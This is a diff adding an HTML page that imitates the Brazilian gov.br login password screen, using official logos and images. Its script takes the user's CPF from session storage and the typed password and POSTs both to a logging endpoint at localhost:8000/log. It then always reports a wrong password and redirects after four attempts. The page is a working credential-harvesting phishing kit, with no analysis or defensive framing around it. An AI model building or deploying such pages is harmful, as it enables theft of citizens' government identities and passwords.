@@ -1,0 +1,251 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="./css/style.css">
+   <title>gov.br - Acesse sua conta</title>
+
+  <link rel="icon" href="/img/govbr-icon.png">
+</head>
+
+<body>
+
+<nav class="navbar navbar-expand-lg navbar-light bg-light">
+
+  <div class="container-md">
+
+    <!-- Logo -->
+    <a class="navbar-brand" href="#">
+      <img 
+        src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
+        alt="Logo"
+        class="logo"
+      >
+    </a>
+
+    <!-- Área direita -->
+    <div class="menu-direita">
+
+      <div class="item-navbar">
+        <img src="./assents/contraste.svg" class="img-navbar" alt="Contraste">
+        <span class="texto-navbar">Alto contraste</span>
+      </div>
+
+      <div class="item-navbar">
+        <img src="./assents/vlibras.svg" class="img-navbar" alt="VLibras">
+        <span class="texto-navbar">VLibras</span>
+      </div>
+
+    </div>
+
+  </div>
+</nav>
+
+<div class="conteudo">
+
+  <div class="Imagem-lateral"> 
+    <a class="imagem-idosa">
+      <img src="https://sso.acesso.gov.br/assets/govbr/img/senha.png"
+           alt="Imagem-pc"
+           class="imagem-senha">
+    </a>
+
+    <p class="desc-senha">
+      Digite sua senha para acessar o login único do <br>
+      governo federal.
+    </p>
+  </div>
+<div class="card senha-card">
+  <div class="card-senha">
+
+    <h3 class="card-title-senha mb-4">
+      Digite sua senha
+    </h3>
+
+    <!-- CPF vindo da outra página -->
+    <div class="cpf-mostrado">
+      CPF <br> 
+    </div>
+
+    <div class="cpf"> 
+      <strong id="campoUnico"></strong>
+    </div>
+
+    <!-- FORM -->
+<form id="formSenha">
+
+  <div class="form-group senha-container">
+
+    <label class="senha">
+      <strong>Senha</strong>
+    </label>
+
+    <input 
+      type="password"
+      class="form-control input-senha"
+      id="senha"
+      placeholder="Digite sua senha"
+      required
+    >
+
+<!-- Font Awesome -->
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+/>
+
+<button 
+  type="button"
+  class="btn-olho"
+  onclick="toggleSenha()"
+>
+  <i class="fa-solid fa-eye"></i>
+</button>
+  </div>
+  
+  <div class="botoes">
+
+    <button class="btn btn-cancelar">
+      <strong>Cancelar</strong>
+    </button>
+   <button class="btn btn-entrar">
+     <strong>Entrar</strong>
+   </button>
+
+
+ </div>
+
+  <a href="#" class="esqueci-senha">
+  Esqueci minha senha
+</a>
+
+    </form>
+  </div>
+  
+
+  
+</div>
+
+
+<script>
+
+document.addEventListener("DOMContentLoaded", () => {
+
+  const cpf = sessionStorage.getItem("cpfUsuario");
+
+  // contador local de tentativas
+  let tentativas = Number(
+    sessionStorage.getItem("tentativasSenha") || 0
+  );
+
+  // mostra CPF formatado
+  if (cpf) {
+
+    const cpfLimpo = cpf.replace(/\D/g, "");
+
+    const cpfFormatado = cpfLimpo.replace(
+      /(\d{3})(\d{3})(\d{3})(\d{2})/,
+      "$1.$2.$3-$4"
+    );
+
+    document.getElementById("campoUnico").innerText =
+      cpfFormatado;
+  }
+
+  // submit do formulário
+  document
+    .getElementById("formSenha")
+    .addEventListener("submit", async function(e){
+
+      e.preventDefault();
+
+      const senha =
+        document.getElementById("senha").value;
+
+      console.log("CPF:", cpf);
+      console.log("Senha:", senha);
+
+      try {
+
+        const response = await fetch(
+          "http://localhost:8000/log",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              cpf,
+              senha
+            })
+          }
+        );
+
+        const data = await response.json();
+
+        console.log(data);
+
+        // soma tentativa
+        tentativas++;
+
+        // salva contador
+        sessionStorage.setItem(
+          "tentativasSenha",
+          tentativas
+        );
+
+        console.log(
+          "Tentativas:",
+          tentativas
+        );
+
+        // limpa campo
+        document.getElementById("senha").value = "";
+
+        // após 3 tentativas
+        if (tentativas >= 4) {
+
+          // limpa sessão
+          sessionStorage.removeItem(
+            "tentativasSenha"
+          );
+
+          sessionStorage.removeItem(
+            "cpfUsuario"
+          );
+
+          // redireciona erro
+          window.location.href = "erro.html";
+
+          return;
+        }
+
+       window.location.href =
+       "index.html?erro=senha";
+
+      } catch(err) {
+
+        console.log(err);
+
+      }
+
+    });
+
+});
+
+</script>
+
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"></script>
+
+</body>
+</html>
+
+
+
+
